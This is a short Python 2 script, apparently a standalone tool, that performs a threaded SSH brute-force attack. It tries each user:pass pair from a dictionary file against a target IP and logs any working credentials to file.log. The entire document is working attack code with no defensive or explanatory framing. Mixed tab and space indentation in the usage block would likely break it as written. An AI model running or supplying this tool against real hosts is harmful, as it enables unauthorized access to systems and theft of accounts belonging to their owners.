#!/usr/bin/env python

import paramiko, sys, time, threading

if len(sys.argv) < 3:

	print "Usage: %s IP /home/petrisor/python/dict" % (str(sys.argv[0]))
	print "Example: %s 10.0.0.1 dict.txt" % (str(sys.argv[0]))
        print "Dictionary should be in user:pass format"
	sys.exit(1)

ip=sys.argv[1]; filename=sys.argv[2]

fd = open(filename, "r")
logf=open("file.log","w")
def attempt(IP,UserName, Password):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
	   ssh.connect(IP,username=UserName, password=Password)
	except paramiko.AuthenticationException:
	   return False
	else:
	   logf.write(" %s:%s -  found for %s \n" %(UserName, Password, IP))
	   print '[!] %s:%s found for IP %s' %(UserName, Password, IP)
	ssh.close()
	return

print '[+] Bruteforcing against %s with dictionary %s' %(ip, filename)
for line in fd.readlines():
	username, password = line.strip().split(":")
	t = threading.Thread(target=attempt, args=(ip,username,password))
	t.start()
	time.sleep(0.3)
fd.close()
sys.exit(0)
